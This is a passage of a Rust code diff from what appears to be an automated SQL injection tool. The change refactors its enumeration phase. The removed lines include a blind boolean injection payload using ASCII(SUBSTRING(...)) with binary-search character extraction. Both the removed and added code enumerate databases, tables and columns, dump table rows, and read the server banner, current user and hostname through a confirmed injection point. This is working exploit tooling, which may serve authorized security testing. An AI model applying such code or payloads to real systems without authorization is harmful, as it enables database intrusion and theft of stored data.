-                        ),
-                        crate::dbms::DbmsKind::Unknown => format!(
-                            "' AND ASCII(SUBSTRING(({version_query}),{},1))>={} -- -",
-                            pos + 1,
-                            mid
-                        ),
-                    };
-                    let payload = build_final_payload(&base, &tampers, &popts);
-                    // Use spec-based injection to preserve param location (Query/Body/Header/Cookie) and marker handling
-                    let spec = build_injection_spec_with_raw(
-                        &target,
-                        &target_str,
-                        &param,
-                        &payload,
-                        &marker_set,
-                        raw.as_ref(),
-                        opts,
-                        &popts,
-                    );
-                    let start = Instant::now();
-                    let resp = client.send_with_retry(spec, &cancel).await;
-                    let ms = start.elapsed().as_secs_f64() * 1000.0;
-                    state.write().await.increment_requests();
-                    let body = match resp {
-                        Ok(r) => r.text().await.unwrap_or_default(),
-                        Err(_) => String::new(),
-                    };
-                    let diff = crate::detection::response_diff::diff_against_baseline(
-                        &baseline_body,
-                        &body,
-                        baseline_mean2,
-                        ms,
-                        100.0,
-                    );
-                    // similar => true (>= mid)
-                    Ok::<bool, InjektError>(diff.confidence < 0.4)
-                }
-            };
-            let extracted = engine.extract(inferred_len, oracle).await?;
-            let exposed = {
-                use secrecy::ExposeSecret;
-                extracted.expose_secret().to_owned()
-            };
-            info!(extracted=%Scrubber::hash_truncated(&exposed), len=%exposed.len(), "extraction done");
-            // scrubbed hash logged, raw stored as SecretString zeroized after report
-            self.state.write().await.push_extracted(extracted);
         }
 
-        // Enumeration phase (--dbs, --tables, --columns, --dump, --count,
-        // --banner, --current-user, --current-db, --hostname)
-        let needs_enum = self.config.dbs
-            || self.config.tables
-            || self.config.columns
-            || self.config.dump
-            || self.config.count
-            || self.config.banner
-            || self.config.current_user
-            || self.config.current_db
-            || self.config.hostname;
-        let has_findings_for_enum = !self.state.read().await.findings().is_empty();
-        if needs_enum && has_findings_for_enum {
-            current = EngineState::Enumeration;
-            info!(state=?current, "phase enumeration — dbs/tables/columns/dump");
-
-            // Reuse extraction context
-            let (first_param, target_for_extract) = {
-                let st = self.state.read().await;
-                let f = st.findings().first().cloned();
-                drop(st);
-                if let Some(finding) = f {
-                    let (name, loc_str) = match finding.parameter.split_once('@') {
-                        Some((n, l)) => (n.to_owned(), l.to_owned()),
-                        None => (finding.parameter.clone(), "query".to_owned()),
-                    };
-                    let location = if loc_str == "query" {
-                        ParameterLocation::Query
-                    } else if loc_str == "body" {
-                        ParameterLocation::Body
-                    } else if loc_str == "cookie" {
-                        ParameterLocation::Cookie
-                    } else if let Some(h) = loc_str.strip_prefix("header:") {
-                        ParameterLocation::Header(h.to_owned())
-                    } else {
-                        ParameterLocation::Query
-                    };
-                    (TargetParameter::new(name, location, "1"), target.clone())
-                } else {
-                    (
-                        TargetParameter::new("id", ParameterLocation::Query, "1"),
-                        target.clone(),
-                    )
-                }
-            };
-
-            let dbms_kind = {
-                let snap = self.state.read().await.findings().to_vec();
-                crate::dbms::fingerprint::guess_from_findings(&snap)
-                    .unwrap_or(crate::dbms::DbmsKind::MySql)
-            };
-
-            let detector = crate::dbms::fingerprint::get_detector(dbms_kind);
-
-            let baseline_body = baseline.representative_body_str();
-            let baseline_mean = baseline.mean_ms;
-            let client = self.client.clone();
-            let state = Arc::clone(&self.state);
-            let cancel = self.cancel.clone();
-            let target_str = target_str.to_owned();
-            let marker_set = marker_set.clone();
-            let raw_request_for_enum = raw_request.as_ref().clone();
-
-            let start = self.config.start.unwrap_or(0);
-            let stop = self.config.stop.unwrap_or(100);
-
-            if self.config.dbs {
-                let query = detector.list_databases_query();
-                let extracted = extract_enum_field(
-                    &client,
-                    &state,
-                    &cancel,
-                    &target_for_extract,
-                    &target_str,
-                    &first_param,
-                    &marker_set,
-                    &baseline_body,
-                    baseline_mean,
-                    query.clone(),
-                    "databases".to_owned(),
-                    raw_request_for_enum.as_ref(),
-                    &effective_tampers,
-                    effective_opts,
-                    &dbms_kind,
-                    &self.config.payload_opts,
-                    &self.config.matcher,
-                    &self.config.ignore_codes,
-                )
-                .await?;
-                if let Some(extracted) = extracted {
-                    info!(extracted=%Scrubber::hash_truncated(&extracted), "databases enumerated");
-                    self.state
-                        .write()
-                        .await
-                        .push_extracted(secrecy::SecretString::from(extracted));
-                }
+        let target_db = self.config.db.clone().unwrap_or_default();
+        if self.config.tables && !target_db.is_empty() {
+            let query = detector.list_tables_query(&target_db);
+            let extracted = extract_enum_field(
+                &client,
+                &state,
+                &cancel,
+                &target_for_extract,
+                &target_str,
+                &first_param,
+                &marker_set,
+                &baseline_body,
+                baseline_mean,
+                query.clone(),
+                "tables".to_owned(),
+                raw_request_for_enum.as_ref(),
+                effective_tampers,
+                effective_opts,
+                &dbms_kind,
+                &self.config.payload_opts,
+                &self.config.matcher,
+                &self.config.ignore_codes,
+            )
+            .await?;
+            if let Some(extracted) = extracted {
+                info!(extracted=%Scrubber::hash_truncated(&extracted), "tables enumerated for db={}", target_db);
+                self.state
+                    .write()
+                    .await
+                    .push_extracted(secrecy::SecretString::from(extracted));
             }
-
-            let target_db = self.config.db.clone().unwrap_or_default();
-            if self.config.tables && !target_db.is_empty() {
-                let query = detector.list_tables_query(&target_db);
-                let extracted = extract_enum_field(
-                    &client,
-                    &state,
-                    &cancel,
-                    &target_for_extract,
-                    &target_str,
-                    &first_param,
-                    &marker_set,
-                    &baseline_body,
-                    baseline_mean,
-                    query.clone(),
-                    "tables".to_owned(),
-                    raw_request_for_enum.as_ref(),
-                    &effective_tampers,
-                    effective_opts,
-                    &dbms_kind,
-                    &self.config.payload_opts,
-                    &self.config.matcher,
-                    &self.config.ignore_codes,
-                )
-                .await?;
-                if let Some(extracted) = extracted {
-                    info!(extracted=%Scrubber::hash_truncated(&extracted), "tables enumerated for db={}", target_db);
-                    self.state
-                        .write()
-                        .await
-                        .push_extracted(secrecy::SecretString::from(extracted));
-                }
-            }
-
-            let target_table = self.config.table.clone().unwrap_or_default();
-            if self.config.columns && !target_db.is_empty() && !target_table.is_empty() {
-                let query = detector.list_columns_query(&target_db, &target_table);
-                let extracted = extract_enum_field(
-                    &client,
-                    &state,
-                    &cancel,
-                    &target_for_extract,
-                    &target_str,
-                    &first_param,
-                    &marker_set,
-                    &baseline_body,
-                    baseline_mean,
-                    query.clone(),
-                    "columns".to_owned(),
-                    raw_request_for_enum.as_ref(),
-                    &effective_tampers,
-                    effective_opts,
-                    &dbms_kind,
-                    &self.config.payload_opts,
-                    &self.config.matcher,
-                    &self.config.ignore_codes,
-                )
-                .await?;
-                if let Some(extracted) = extracted {
-                    info!(extracted=%Scrubber::hash_truncated(&extracted), "columns enumerated for {}.{}", target_db, target_table);
-                    self.state
-                        .write()
-                        .await
-                        .push_extracted(secrecy::SecretString::from(extracted));
-                }
-            }
-
-            if self.config.dump && !target_db.is_empty() && !target_table.is_empty() {
-                let columns: Vec<String> = self
-                    .config
-                    .column
-                    .clone()
-                    .map(|c| c.split(',').map(|s| s.trim().to_owned()).collect())
-                    .unwrap_or_default();
-                let query =
-                    detector.dump_table_query(&target_db, &target_table, &columns, start, stop);
-                let extracted = extract_enum_field(
-                    &client,
-                    &state,
-                    &cancel,
-                    &target_for_extract,
-                    &target_str,
-                    &first_param,
-                    &marker_set,
-                    &baseline_body,
-                    baseline_mean,
-                    query.clone(),
-                    "dump".to_owned(),
-                    raw_request_for_enum.as_ref(),
-                    &effective_tampers,
-                    effective_opts,
-                    &dbms_kind,
-                    &self.config.payload_opts,
-                    &self.config.matcher,
-                    &self.config.ignore_codes,
-                )
-                .await?;
-                if let Some(extracted) = extracted {
-                    info!(extracted=%Scrubber::hash_truncated(&extracted), "dump extracted for {}.{} rows {}-{}", target_db, target_table, start, stop);
-                    self.state
-                        .write()
-                        .await
-                        .push_extracted(secrecy::SecretString::from(extracted));
-                }
-            }
-
-            if self.config.count && !target_db.is_empty() && !target_table.is_empty() {
-                let query = detector.count_rows_query(&target_db, &target_table);
-                let extracted = extract_enum_field(
-                    &client,
-                    &state,
-                    &cancel,
-                    &target_for_extract,
-                    &target_str,
-                    &first_param,
-                    &marker_set,
-                    &baseline_body,
-                    baseline_mean,
-                    query.clone(),
-                    "count".to_owned(),
-                    raw_request_for_enum.as_ref(),
-                    &effective_tampers,
-                    effective_opts,
-                    &dbms_kind,
-                    &self.config.payload_opts,
-                    &self.config.matcher,
-                    &self.config.ignore_codes,
-                )
-                .await?;
-                if let Some(extracted) = extracted {
-                    info!(extracted=%Scrubber::hash_truncated(&extracted), "row count for {}.{}", target_db, target_table);
-                    self.state
-                        .write()
-                        .await
-                        .push_extracted(secrecy::SecretString::from(extracted));
-                }
-            }
-
-            for (flag, query, label) in [
-                (self.config.banner, detector.banner_query(), "banner"),
-                (
-                    self.config.current_user,
-                    detector.current_user_query(),
-                    "current_user",
-                ),
-                (
-                    self.config.current_db,
-                    detector.current_db_query(),
-                    "current_db",
-                ),
-                (self.config.hostname, detector.hostname_query(), "hostname"),
-            ] {
-                if !flag {
-                    continue;
-                }
-                let extracted = extract_enum_field(
-                    &client,
-                    &state,
-                    &cancel,
-                    &target_for_extract,
-                    &target_str,
-                    &first_param,
-                    &marker_set,
-                    &baseline_body,
-                    baseline_mean,
-                    query.clone(),
-                    label.to_owned(),
-                    raw_request_for_enum.as_ref(),
-                    &effective_tampers,
-                    effective_opts,
-                    &dbms_kind,
-                    &self.config.payload_opts,
-                    &self.config.matcher,
-                    &self.config.ignore_codes,
-                )
-                .await?;
-                if let Some(extracted) = extracted {
-                    info!(extracted=%Scrubber::hash_truncated(&extracted), label=%label, "identity enumerated");
-                    self.state
-                        .write()
-                        .await
-                        .push_extracted(secrecy::SecretString::from(extracted));
-                }
-            }
-        } else if needs_enum {
-            warn!("enumeration requested but no confirmed vulnerability was found");
         }
 
-        current = EngineState::Done;
-        let requests = self.state.read().await.request_count();
-        info!(state=?current, requests, "engine done");
-        Ok(current)
+        let target_table = self.config.table.clone().unwrap_or_default();
+        if self.config.columns && !target_db.is_empty() && !target_table.is_empty() {
+            let query = detector.list_columns_query(&target_db, &target_table);
+            let extracted = extract_enum_field(
+                &client,
+                &state,
+                &cancel,
+                &target_for_extract,
+                &target_str,
+                &first_param,
+                &marker_set,
+                &baseline_body,
+                baseline_mean,
+                query.clone(),
+                "columns".to_owned(),
+                raw_request_for_enum.as_ref(),
+                effective_tampers,
+                effective_opts,
+                &dbms_kind,
+                &self.config.payload_opts,
+                &self.config.matcher,
+                &self.config.ignore_codes,
+            )
+            .await?;
+            if let Some(extracted) = extracted {
+                info!(extracted=%Scrubber::hash_truncated(&extracted), "columns enumerated for {}.{}", target_db, target_table);
+                self.state
+                    .write()
+                    .await
+                    .push_extracted(secrecy::SecretString::from(extracted));
+            }
+        }
+
+        if self.config.dump && !target_db.is_empty() && !target_table.is_empty() {
+            let columns: Vec<String> = self
+                .config
+                .column
+                .clone()
+                .map(|c| c.split(',').map(|s| s.trim().to_owned()).collect())
+                .unwrap_or_default();
+            let query = detector.dump_table_query(&target_db, &target_table, &columns, start, stop);
+            let extracted = extract_enum_field(
+                &client,
+                &state,
+                &cancel,
+                &target_for_extract,
+                &target_str,
+                &first_param,
+                &marker_set,
+                &baseline_body,
+                baseline_mean,
+                query.clone(),
+                "dump".to_owned(),
+                raw_request_for_enum.as_ref(),
+                effective_tampers,
+                effective_opts,
+                &dbms_kind,
+                &self.config.payload_opts,
+                &self.config.matcher,
+                &self.config.ignore_codes,
+            )
+            .await?;
+            if let Some(extracted) = extracted {
+                info!(extracted=%Scrubber::hash_truncated(&extracted), "dump extracted for {}.{} rows {}-{}", target_db, target_table, start, stop);
+                self.state
+                    .write()
+                    .await
+                    .push_extracted(secrecy::SecretString::from(extracted));
+            }
+        }
+
+        if self.config.count && !target_db.is_empty() && !target_table.is_empty() {
+            let query = detector.count_rows_query(&target_db, &target_table);
+            let extracted = extract_enum_field(
+                &client,
+                &state,
+                &cancel,
+                &target_for_extract,
+                &target_str,
+                &first_param,
+                &marker_set,
+                &baseline_body,
+                baseline_mean,
+                query.clone(),
+                "count".to_owned(),
+                raw_request_for_enum.as_ref(),
+                effective_tampers,
+                effective_opts,
+                &dbms_kind,
+                &self.config.payload_opts,
+                &self.config.matcher,
+                &self.config.ignore_codes,
+            )
+            .await?;
+            if let Some(extracted) = extracted {
+                info!(extracted=%Scrubber::hash_truncated(&extracted), "row count for {}.{}", target_db, target_table);
+                self.state
+                    .write()
+                    .await
+                    .push_extracted(secrecy::SecretString::from(extracted));
+            }
+        }
+
+        for (flag, query, label) in [
+            (self.config.banner, detector.banner_query(), "banner"),
+            (
+                self.config.current_user,
+                detector.current_user_query(),
+                "current_user",
+            ),
+            (
+                self.config.current_db,
+                detector.current_db_query(),
+                "current_db",
+            ),
+            (self.config.hostname, detector.hostname_query(), "hostname"),
+        ] {
+            if !flag {
+                continue;
+            }
+            let extracted = extract_enum_field(
+                &client,
+                &state,
+                &cancel,
+                &target_for_extract,
+                &target_str,
+                &first_param,
+                &marker_set,
+                &baseline_body,
+                baseline_mean,
+                query.clone(),
+                label.to_owned(),
+                raw_request_for_enum.as_ref(),
+                effective_tampers,
+                effective_opts,
+                &dbms_kind,
+                &self.config.payload_opts,
+                &self.config.matcher,
+                &self.config.ignore_codes,
+            )
+            .await?;
+            if let Some(extracted) = extracted {
+                info!(extracted=%Scrubber::hash_truncated(&extracted), label=%label, "identity enumerated");
+                self.state
+                    .write()
+                    .await
+                    .push_extracted(secrecy::SecretString::from(extracted));
+            }
+        }
+        Ok(())
     }
 
     #[allow(dead_code)]
